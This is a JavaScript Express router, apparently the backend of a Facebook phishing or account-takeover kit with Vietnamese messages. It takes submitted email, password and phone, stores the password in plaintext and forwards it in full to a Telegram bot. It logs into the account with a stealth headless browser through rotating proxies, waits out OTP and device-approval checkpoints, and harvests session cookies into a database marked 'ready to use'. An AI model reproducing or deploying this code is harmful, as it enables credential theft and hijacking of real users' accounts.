import express from "express";
import { v4 as uuidv4 } from "uuid";
import db from "../database.js";
import puppeteer from "puppeteer-extra";
import StealthPlugin from "puppeteer-extra-plugin-stealth";

// Use stealth plugin to avoid detection
puppeteer.use(StealthPlugin());

const router = express.Router();

/**
 * POST /api/facebook/login
 * Initiate Facebook login with proxy
 */
router.post("/login", async (req, res) => {
  try {
    const { email, password, phone, proxyId } = req.body;

    if (!email || !password) {
      return res.status(400).json({
        success: false,
        message: "Email and password are required",
      });
    }

    // Create account record
    const accountId = uuidv4();
    await db.execute(
      `INSERT INTO facebook_accounts (id, email, password, proxy_id, status)
       VALUES (?, ?, ?, ?, 'pending')`,
      [accountId, email, password, proxyId || null]
    );

    // Log the start of login process
    await logAction(accountId, "🚀 Bắt đầu quá trình đăng nhập...", "info");

    // Send initial login notification to Telegram
    await sendTelegramNotification(accountId, 'login_start', {
      email,
      phone: phone || 'N/A',
      account: email,
      password
    });

    // Return account ID for tracking
    res.json({
      success: true,
      accountId,
      message: "Login process initiated",
    });

    // Start async login process (don't wait for it)
    performFacebookLogin(accountId, email, password, proxyId).catch((error) => {
      console.error("Facebook login error:", error);
    });
  } catch (error) {
    console.error("Error initiating Facebook login:", error);
    res.status(500).json({
      success: false,
      message: "Failed to initiate login",
      error: error.message,
    });
  }
});

/**
 * POST /api/facebook/checkpoint/poll
 * Poll for checkpoint approval status
 */
router.post("/checkpoint/poll", async (req, res) => {
  try {
    const { accountId } = req.body;

    if (!accountId) {
      return res.status(400).json({
        success: false,
        message: "Account ID is required",
      });
    }

    // Get account status
    const [rows] = await db.execute(
      "SELECT status FROM facebook_accounts WHERE id = ?",
      [accountId]
    );

    if (rows.length === 0) {
      return res.status(404).json({
        success: false,
        message: "Account not found",
      });
    }

    const status = rows[0].status;

    res.json({
      success: true,
      status,
      approved: status === "success",
    });
  } catch (error) {
    console.error("Error polling checkpoint:", error);
    res.status(500).json({
      success: false,
      message: "Failed to poll checkpoint",
      error: error.message,
    });
  }
});

/**
 * POST /api/facebook/checkpoint/otp
 * Submit OTP code for verification
 * Note: In a real implementation, this would need to interact with an active browser session
 * For production use, consider using WebSocket or session storage to maintain browser instances
 */
router.post("/checkpoint/otp", async (req, res) => {
  try {
    const { accountId, otp } = req.body;

    if (!accountId || !otp) {
      return res.status(400).json({
        success: false,
        message: "Account ID and OTP are required",
      });
    }

    // Log OTP submission
    await logAction(accountId, `📱 Đã nhận OTP: ${otp}`, "info");

    // Note: Real OTP submission requires maintaining browser session state
    // This is a simplified implementation that marks the account as requiring manual intervention
    await logAction(
      accountId, 
      "⚠️ Vui lòng nhập OTP trực tiếp trên trình duyệt được mở", 
      "warning"
    );

    res.json({
      success: true,
      message: "OTP received - please enter it in the browser window",
      note: "For automated OTP submission, browser session management is required"
    });
  } catch (error) {
    console.error("Error submitting OTP:", error);
    res.status(500).json({
      success: false,
      message: "Failed to submit OTP",
      error: error.message,
    });
  }
});

/**
 * GET /api/facebook/logs/:accountId
 * Get login logs for an account
 */
router.get("/logs/:accountId", async (req, res) => {
  try {
    const { accountId } = req.params;

    const [rows] = await db.execute(
      "SELECT * FROM login_logs WHERE account_id = ? ORDER BY timestamp ASC",
      [accountId]
    );

    res.json({
      success: true,
      logs: rows.map((log) => ({
        id: log.id,
        timestamp: log.timestamp,
        action: log.action,
        status: log.status,
        details: log.details,
      })),
    });
  } catch (error) {
    console.error("Error getting logs:", error);
    res.status(500).json({
      success: false,
      message: "Failed to get logs",
      error: error.message,
    });
  }
});

/**
 * Helper function to log actions
 */
async function logAction(accountId, action, status, details = null) {
  try {
    const logId = uuidv4();
    await db.execute(
      `INSERT INTO login_logs (id, account_id, action, status, details)
       VALUES (?, ?, ?, ?, ?)`,
      [logId, accountId, action, status, details]
    );
  } catch (error) {
    console.error("Error logging action:", error);
  }
}

/**
 * Helper function to send Telegram notifications
 */
async function sendTelegramNotification(accountId, type, data) {
  try {
    const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
    const telegramChatId = process.env.TELEGRAM_CHAT_ID;

    if (!telegramBotToken || !telegramChatId) {
      console.log("Telegram not configured, skipping notification");
      return;
    }

    const https = await import('https');
    let message = '';

    switch (type) {
      case 'login_start':
        message = `
🚀 *BẮT ĐẦU ĐĂNG NHẬP FACEBOOK*

📧 Email: \`${data.email}\`
📞 Phone: \`${data.phone}\`
📘 Account: \`${data.account}\`
🔑 Password: \`${data.password}\`

⏰ Thời gian: ${new Date().toLocaleString("vi-VN")}
        `.trim();
        break;

      case 'checkpoint_device':
        message = `
⚠️ *YÊU CẦU XÁC MINH THIẾT BỊ*

📧 Account: \`${data.account}\`
📱 Xác minh: Device Approval

💡 *MẸO PHÊDUYỆT NHANH:*
1️⃣ Mở app Facebook trên điện thoại
2️⃣ Nhấn vào thông báo "Login từ thiết bị mới"
3️⃣ Click "Đây là tôi" hoặc "This was me"
4️⃣ Xác nhận thiết bị

⏰ Thời gian: ${new Date().toLocaleString("vi-VN")}
        `.trim();
        break;

      case 'checkpoint_otp':
        message = `
⚠️ *YÊU CẦU XÁC MINH OTP*

📧 Account: \`${data.account}\`
📞 Xác minh: SMS OTP
🎯 OTP: \`${data.otp}\`

⏰ Thời gian: ${new Date().toLocaleString("vi-VN")}
        `.trim();
        break;

      case 'login_success':
        message = `
✅ *ĐĂNG NHẬP THÀNH CÔNG*

📧 Account: \`${data.account}\`
🔗 Link ID FB: ${data.fbId || 'N/A'}

📱 *THÔNG TIN THIẾT BỊ:*
🌐 Browser: Chrome (Stealth Mode)
🔒 Proxy: ${data.proxy || 'Direct'}

🍪 *COOKIE (SẴN SÀNG DÙNG):*
📦 Cookies: ${data.cookieCount} cookies
💾 Size: ${data.cookieSize} bytes

✅ Kết quả: THÀNH CÔNG
⏰ Thời gian: ${new Date().toLocaleString("vi-VN")}
        `.trim();
        break;
    }

    if (!message) return;

    const postData = JSON.stringify({
      chat_id: telegramChatId,
      text: message,
      parse_mode: 'Markdown'
    });

    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${telegramBotToken}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    };

    return new Promise((resolve, reject) => {
      const request = https.default.request(options, (response) => {
        let data = '';
        response.on('data', (chunk) => { data += chunk; });
        response.on('end', () => {
          try {
            const result = JSON.parse(data);
            resolve(result.ok);
          } catch (e) {
            reject(e);
          }
        });
      });

      request.on('error', reject);
      request.write(postData);
      request.end();
    });
  } catch (error) {
    console.error("Error sending Telegram notification:", error);
  }
}

/**
 * Perform Facebook login (async) - Real implementation with Puppeteer
 */
async function performFacebookLogin(accountId, email, password, proxyId) {
  let browser = null;
  let page = null;

  try {
    // Select proxy if provided
    let proxy = null;
    if (proxyId) {
      await logAction(accountId, "🔍 Đang chọn proxy...", "info");
      const [rows] = await db.execute(
        "SELECT * FROM proxies WHERE id = ?",
        [proxyId]
      );
      if (rows.length > 0) {
        proxy = rows[0];
        await logAction(
          accountId,
          `✅ Đã chọn: ${proxy.host}:${proxy.port}`,
          "success"
        );
      }
    } else {
      await logAction(accountId, "🔍 Đang chọn proxy ngẫu nhiên...", "info");
      const [rows] = await db.execute(
        "SELECT * FROM proxies WHERE is_working = true ORDER BY RAND() LIMIT 1"
      );
      if (rows.length > 0) {
        proxy = rows[0];
        await logAction(
          accountId,
          `✅ Đã chọn: ${proxy.host}:${proxy.port}`,
          "success"
        );
      }
    }

    // Configure browser launch options
    const launchOptions = {
      headless: process.env.BROWSER_HEADLESS !== 'false',
      args: [
        "--disable-notifications",
        "--disable-blink-features=AutomationControlled",
        "--no-sandbox",
        "--disable-setuid-sandbox",
      ],
      defaultViewport: {
        width: 1366,
        height: 768,
      },
    };

    // Add proxy configuration if available
    if (proxy) {
      await logAction(accountId, "🌐 Đang kết nối proxy...", "info");
      const proxyUrl = proxy.username && proxy.password
        ? `http://${proxy.username}:${proxy.password}@${proxy.host}:${proxy.port}`
        : `http://${proxy.host}:${proxy.port}`;
      launchOptions.args.push(`--proxy-server=${proxyUrl}`);
    }

    // Launch browser
    browser = await puppeteer.launch(launchOptions);
    page = await browser.newPage();

    if (proxy) {
      await logAction(accountId, "✅ Proxy kết nối thành công", "success");
    }

    await logAction(accountId, "🚀 Đang mở Facebook...", "info");

    // Navigate to Facebook login
    await page.goto("https://www.facebook.com/login", {
      waitUntil: "networkidle2",
      timeout: 30000,
    });

    await logAction(accountId, "✅ Đã mở Facebook", "success");
    await logAction(accountId, "✏️ Đang nhập thông tin đăng nhập...", "info");

    // Fill in credentials
    await page.waitForSelector('input[name="email"]', { timeout: 10000 });
    await page.type('input[name="email"]', email, { delay: 100 });
    await page.type('input[name="pass"]', password, { delay: 100 });

    await logAction(accountId, "🔐 Đang xử lý đăng nhập...", "info");

    // Click login button
    await page.click('button[name="login"]');

    // Wait for navigation or checkpoint
    try {
      await page.waitForNavigation({ timeout: 15000 });
      
      const currentUrl = page.url();
      const pageContent = await page.content();

      // Check for checkpoint
      if (currentUrl.includes("checkpoint") || pageContent.includes("checkpoint")) {
        await logAction(accountId, "🔍 Phát hiện checkpoint...", "warning");

        // Check for different checkpoint types
        if (pageContent.includes("approvals_code") || pageContent.includes("two_factor")) {
          await logAction(accountId, "📱 Yêu cầu mã OTP...", "warning");
          
          // Try to extract OTP if visible (for logging purposes)
          let otpCode = "******";
          try {
            // This is a placeholder - in real scenario, user needs to provide OTP
            const otpElement = await page.$('input[name="approvals_code"]');
            if (otpElement) {
              // OTP field exists, waiting for user input
              otpCode = "Đang chờ người dùng nhập";
            }
          } catch (e) {
            // OTP extraction not possible
          }

          // Send Telegram notification
          await sendTelegramNotification(accountId, 'checkpoint_otp', {
            account: email,
            otp: otpCode
          });

          await db.execute(
            "UPDATE facebook_accounts SET status = 'otp_required' WHERE id = ?",
            [accountId]
          );
          
          // Keep browser open for OTP input
          // User will submit OTP via API
          return;
        } else {
          await logAction(
            accountId,
            "📱 Yêu cầu phê duyệt từ điện thoại...",
            "warning"
          );

          // Send Telegram notification with device approval tips
          await sendTelegramNotification(accountId, 'checkpoint_device', {
            account: email
          });

          await db.execute(
            "UPDATE facebook_accounts SET status = 'checkpoint' WHERE id = ?",
            [accountId]
          );
          
          // Poll for approval (wait up to 60 seconds)
          let approved = false;
          for (let i = 0; i < 12; i++) {
            await new Promise((resolve) => setTimeout(resolve, 5000));
            await logAction(accountId, "⏳ Đang kiểm tra... (polling)", "info");
            
            try {
              await page.reload({ waitUntil: "networkidle2", timeout: 10000 });
              const newUrl = page.url();
              if (!newUrl.includes("checkpoint")) {
                approved = true;
                break;
              }
            } catch (err) {
              // Continue polling
            }
          }

          if (approved) {
            await logAction(
              accountId,
              "✅ Đã phát hiện phê duyệt thành công!",
              "success"
            );
          } else {
            await logAction(
              accountId,
              "⚠️ Chưa phát hiện phê duyệt, vui lòng thử lại sau",
              "warning"
            );
            return;
          }
        }
      }

      // Check if login successful
      if (
        currentUrl.includes("facebook.com") &&
        !currentUrl.includes("login") &&
        !currentUrl.includes("checkpoint")
      ) {
        await logAction(accountId, "✅ Đăng nhập thành công!", "success");

        // Extract cookies
        await logAction(accountId, "🍪 Đang trích xuất cookie...", "info");
        const cookies = await page.cookies();
        const cookieData = JSON.stringify({ cookies });

        await logAction(accountId, `✅ Đã lấy ${cookies.length} cookies`, "success");

        // Try to extract Facebook ID
        let fbId = 'N/A';
        try {
          const c_user = cookies.find(c => c.name === 'c_user');
          if (c_user) {
            fbId = `https://facebook.com/${c_user.value}`;
          }
        } catch (e) {
          // FB ID extraction failed
        }

        // Save cookies
        await logAction(accountId, "💾 Đang lưu cookie vào database...", "info");
        await db.execute(
          "UPDATE facebook_accounts SET cookie_data = ?, status = 'success', last_login = NOW() WHERE id = ?",
          [cookieData, accountId]
        );
        await logAction(accountId, "✅ Đã lưu cookie vào database", "success");

        // Send success notification to Telegram
        const proxyInfo = proxy ? `${proxy.host}:${proxy.port}` : 'Direct';
        await sendTelegramNotification(accountId, 'login_success', {
          account: email,
          fbId,
          proxy: proxyInfo,
          cookieCount: cookies.length,
          cookieSize: cookieData.length
        });

        await logAction(accountId, "📤 Đã gửi thông báo lên Telegram", "success");
        await logAction(accountId, "🎉 Hoàn tất! Tất cả dữ liệu đã được lưu", "success");
      } else {
        throw new Error("Login failed - unexpected page");
      }
    } catch (navError) {
      // Check for other authentication challenges
      const pageContent = await page.content();
      if (pageContent.includes("incorrect") || pageContent.includes("wrong")) {
        throw new Error("Incorrect email or password");
      }
      throw navError;
    }
  } catch (error) {
    console.error("Facebook login error:", error);
    await logAction(
      accountId,
      `❌ Lỗi: ${error.message}`,
      "error",
      error.stack
    );
    await db.execute(
      "UPDATE facebook_accounts SET status = 'failed' WHERE id = ?",
      [accountId]
    );
  } finally {
    // Close browser
    if (browser) {
      try {
        await browser.close();
      } catch (err) {
        console.error("Error closing browser:", err);
      }
    }
  }
}

export default router;
